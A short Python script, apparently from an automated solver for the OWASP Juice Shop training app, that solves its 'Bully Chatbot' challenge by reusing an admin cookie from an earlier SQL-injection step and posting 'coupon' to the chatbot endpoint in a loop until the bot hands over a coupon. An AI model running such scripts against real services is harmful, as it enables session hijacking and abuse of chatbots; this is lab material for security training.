"""
This file is used to solve the OWASP Juice-shop Task BULLY CHATBOT
Methodology: We can send the COUPON message to the supporter machine several times, until it gives us COUPON
"""
from plugins import attack as a

class test_get_coupon_class(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/chatbot/respond'

    def generator(self):
        cookie = a.load_cookie('admin')
        json_data = {
            'action': 'query',
            'query': 'coupon',
        }

        return json_data, cookie

    def run(self):
        json_data, cookie = self.generator()
        if cookie:
            response = self.juice_session.post(self.url, json=json_data, cookies=cookie)
            while (response.text.find("pes[Cga+jm") == -1 ):
                # cookies, headers, json_data = self.generator(json_data, new_cookie)
                response = self.juice_session.post(self.url, json=json_data, cookies=cookie)
                print(response.text)

            print("we found coupon:")
            print(response.text)
        else:
            print("Not have authentification yet, please try SQL injection first")